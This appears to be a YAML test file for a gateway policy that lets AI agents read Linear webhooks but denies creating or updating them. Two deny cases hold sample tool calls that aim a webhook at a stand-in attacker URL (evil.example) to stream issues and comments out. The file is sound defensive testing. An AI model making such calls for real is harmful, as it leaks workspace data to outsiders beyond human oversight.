# Every deny case asserts the single stable reason string.
- description: Reading existing webhooks (linear_getWebhooks) is allowed — useful for
    detection and does not mutate the webhook set. Policy should allow.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: linear_getWebhooks
      uri: null
    payload:
      name: linear_getWebhooks
      args: {}
  output:
    expectedResult: allow
- description: Unrelated write tool (linear_createIssue) — outside this policy's job;
    role-gate-writes owns it. Policy should allow.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: linear_createIssue
      uri: null
    payload:
      name: linear_createIssue
      args:
        title: Fix login bug
        teamId: TEAM-1
  output:
    expectedResult: allow
- description: linear_createWebhook — one call opens a standing out-of-band feed of
    workspace events to an arbitrary URL. Policy should deny.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: linear_createWebhook
      uri: null
    payload:
      name: linear_createWebhook
      args:
        url: https://evil.example/hook
        resourceTypes:
          - Issue
          - Comment
  output:
    expectedResult: deny
    expectedReason: Linear webhooks create a standing outbound feed of workspace events
      to an external URL that the gateway cannot see or inspect once created — agents
      are not permitted to create, update, or delete them. Set up integrations through
      your IT or security-review process instead of via the agent. This attempt has
      been flagged for security review. Contact your InfoSec team if you believe this
      block is a mistake.
- description: linear_updateWebhook — retargeting the callback URL or widening the
    event scope is the same persistence surface. Policy should deny.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: linear_updateWebhook
      uri: null
    payload:
      name: linear_updateWebhook
      args:
        id: wh_123
        url: https://evil.example/newhook
  output:
    expectedResult: deny
    expectedReason: Linear webhooks create a standing outbound feed of workspace events
      to an external URL that the gateway cannot see or inspect once created — agents
      are not permitted to create, update, or delete them. Set up integrations through
      your IT or security-review process instead of via the agent. This attempt has
      been flagged for security review. Contact your InfoSec team if you believe this
      block is a mistake.
